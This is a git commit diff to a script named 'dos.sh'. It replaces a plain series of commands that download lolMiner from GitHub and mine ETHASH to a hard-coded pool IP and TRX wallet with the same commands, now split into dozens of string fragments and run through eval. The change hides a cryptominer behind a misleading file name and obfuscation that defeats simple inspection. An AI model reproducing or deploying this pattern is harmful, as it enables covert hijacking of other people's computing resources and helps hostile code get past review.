9899fb2d99c65ae095544b4e1224b4f980df6b9d
chikahusarii <85166601+chikahusarii@users.noreply.github.com>
2022-08-21 00:51:53 +0700

    Update dos.sh

--- dos.sh
+++ dos.sh
@@ -1,6 +1,3 @@
-sudo apt update -y
-apt install git wget nano libpci-dev -y
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
-tar xf lolMiner_v1.31_Lin64.tar.gz
-cd 1.31
-./lolMiner --algo ETHASH --pool 34.127.80.91:5688 --user TRX:TBbwEfGT2h9iXXPbu1p9bgbjKK8YqegfYM.z1
+z="
+";uz='tar.';DBz='o ET';Qz='ps:/';az='ases';Nz='-dev';wz='cd 1';TBz='9bgb';cz='ease';Bz=' apt';Oz=' -y';MBz='user';WBz='fYM.';VBz='Yqeg';sz='1_Li';pz='xf l';Xz='olMi';Dz='ate ';Hz='all ';SBz='bu1p';gz='.31/';Kz=' nan';yz='./lo';Uz='Loll';Rz='/git';XBz='z1';dz='s/do';Yz='ner-';tz='n64.';Pz=' htt';Tz='com/';bz='/rel';Az='sudo';ABz='lMin';HBz='34.1';Lz='o li';Mz='bpci';LBz='8 --';FBz=' --p';Wz='eb/l';hz='lolM';fz='ad/1';qz='ner_';jz='_v1.';mz='.tar';Sz='hub.';GBz='ool ';nz='.gz';NBz=' TRX';Jz='wget';Vz='iedi';Zz='rele';EBz='HASH';QBz='T2h9';JBz='0.91';lz='in64';kz='31_L';KBz=':568';Gz='inst';Iz='git ';CBz='-alg';IBz='27.8';Cz=' upd';OBz=':TBb';xz='.31';RBz='iXXP';Fz='apt ';iz='iner';vz='gz';PBz='wEfG';oz='tar ';BBz='er -';rz='v1.3';UBz='jKK8';Ez='-y';ez='wnlo';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$z$Jz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$jz$kz$lz$mz$nz$z$oz$pz$Xz$qz$rz$sz$tz$uz$vz$z$wz$xz$z$yz$ABz$BBz$CBz$DBz$EBz$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$RBz$SBz$TBz$UBz$VBz$WBz$XBz"
